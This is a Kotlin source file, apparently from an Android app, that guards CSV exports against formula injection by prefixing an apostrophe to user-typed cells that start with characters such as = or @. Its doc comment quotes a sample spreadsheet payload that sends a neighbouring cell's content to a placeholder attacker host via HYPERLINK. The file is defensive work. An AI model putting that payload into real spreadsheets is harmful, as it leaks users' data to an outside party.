package com.readfilestech.read_files_tech.data.text

/**
 * The guard against formula injection of the 2.15.3 (`lib/utils/csv_safe.dart`, H1 v2.12.1): a cell
 * whose first SIGNIFICANT character is `=` `+` `-` `@` (or a tab, a carriage return) can be run as a
 * formula by Excel, LibreOffice or Numbers when the CSV is opened — `=HYPERLINK("http://attacker/?x=" &
 * A1, "click")` sends a neighbouring cell away at the first click. Such a cell gets an ASCII `'` in
 * front: the spreadsheet reads it as text and hides the `'`. OWASP "CSV Injection", CVE-2014-3524.
 *
 * Applied to what the USER types only, never to the cells of a file (D5: the 2.15.3 put a `'` before
 * every `-5` and `+33…` of the file at each save).
 */
object CsvSafe {
    private const val DANGEROUS_LEAD = "=+-@\t\r"

    /**
     * Skipped before the first significant character: a single space before `=HYPERLINK(…)` escaped the
     * guard, and several spreadsheets trim leading blanks on import. A line break is skipped, not
     * dangerous in itself: it serves to HIDE what follows.
     */
    private const val LEADING_BLANKS = " \n\t\r\u00A0\u2007"

    /** [cell] with a `'` in front when its first significant character is dangerous; otherwise [cell], blanks included. */
    fun sanitizeCell(cell: String): String {
        val first = cell.indexOfFirst { it !in LEADING_BLANKS }
        return if (first >= 0 && cell[first] in DANGEROUS_LEAD) "'$cell" else cell
    }

    /**
     * Rows into CSV text, each cell through [sanitizeCell] — `CsvSafe.encodeSafe` of the 2.15.3, whose
     * `Csv().encode` wrote `,` and `\r\n`, a field quoted when it needs to be ([quotedField]).
     */
    fun encodeSafe(rows: List<List<String>>, separator: Char = ',', lineBreak: String = CRLF): String =
        rows.joinToString(lineBreak) { row ->
            row.joinToString(separator.toString()) { quotedField(sanitizeCell(it), separator) }
        }

    private const val CRLF = "\r\n"
}

/**
 * [text] as a CSV field (RFC 4180): between double quotes, each `"` doubled, when it holds [separator],
 * a quote or a line break — or always when [quoted], the CSV editor keeping the quotes a cell had.
 */
internal fun quotedField(text: String, separator: Char, quoted: Boolean = false): String {
    val needed = quoted || text.any { it == separator || it in SPECIAL }
    return if (needed) "\"" + text.replace("\"", "\"\"") + "\"" else text
}

/** What a field cannot hold unquoted, the separator apart. */
private val SPECIAL = charArrayOf(CsvScanner.QUOTE, CsvScanner.CR, CsvScanner.LF)
